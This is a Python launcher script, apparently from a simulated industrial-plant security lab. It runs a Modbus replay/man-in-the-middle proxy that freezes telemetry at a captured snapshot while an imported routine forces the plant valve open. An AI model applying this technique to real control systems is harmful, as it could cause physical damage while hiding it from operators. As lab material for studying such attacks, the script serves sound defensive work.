from __future__ import annotations

import argparse
import logging
import time

from common.config import PLANT_HOST, PLANT_PORT, SOURCE_PORTS
from common.client_helper import PlantClient
from replay.attack import begin_hidden_drain
from replay.proxy import ReplayProxy


def main() -> None:
    parser = argparse.ArgumentParser(description="Run a local Modbus replay/MITM proxy.")
    parser.add_argument("--listen-port", type=int, default=15020)
    parser.add_argument("--host", default=PLANT_HOST)
    parser.add_argument("--plant-port", type=int, default=PLANT_PORT)
    parser.add_argument("--snapshot-wait", type=float, default=60.0, help="seconds to wait for the first proxied input-register read")
    args = parser.parse_args()
    logging.basicConfig(level=logging.INFO, format="%(asctime)s | %(levelname)s | %(message)s")
    logger = logging.getLogger("attack.replay")
    proxy = ReplayProxy("127.0.0.1", args.listen_port, args.host, args.plant_port)
    client = PlantClient(args.host, args.plant_port, SOURCE_PORTS["replay"], logger)
    try:
        proxy.start()
        logger.warning(
            "REPLAY_ARMED | MITM proxy listening on 127.0.0.1:%s -> forwarding to Plant %s:%s.",
            args.listen_port,
            args.host,
            args.plant_port,
        )
        logger.info(
            "REPLAY_WAITING | Waiting up to %.0fs for Backend poller on 127.0.0.1:%s to capture a legitimate reading snapshot...",
            args.snapshot_wait,
            args.listen_port,
        )
        if not proxy.snapshot_ready.wait(args.snapshot_wait):
            logger.error(
                "REPLAY_TIMEOUT | No Modbus read requests were received on port %s within %.0fs.\n"
                "-> In this loopback simulation, the Backend must be configured to poll the proxy port:\n"
                "   PLANT_PORT=%s uv run uvicorn app.main:app (or update backend/.env)\n"
                "-> See attacks/README.md for the complete real-world MITM explanation.",
                args.listen_port,
                args.snapshot_wait,
                args.listen_port,
            )
            return
        client.connect()
        begin_hidden_drain(client)
        logger.warning("REPLAY_ACTIVE | Telemetry is now frozen at proxy while the real plant valve is forced open.")
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        logger.info("REPLAY_STOPPED")
    finally:
        proxy.close()
        client.close()


if __name__ == "__main__":
    main()
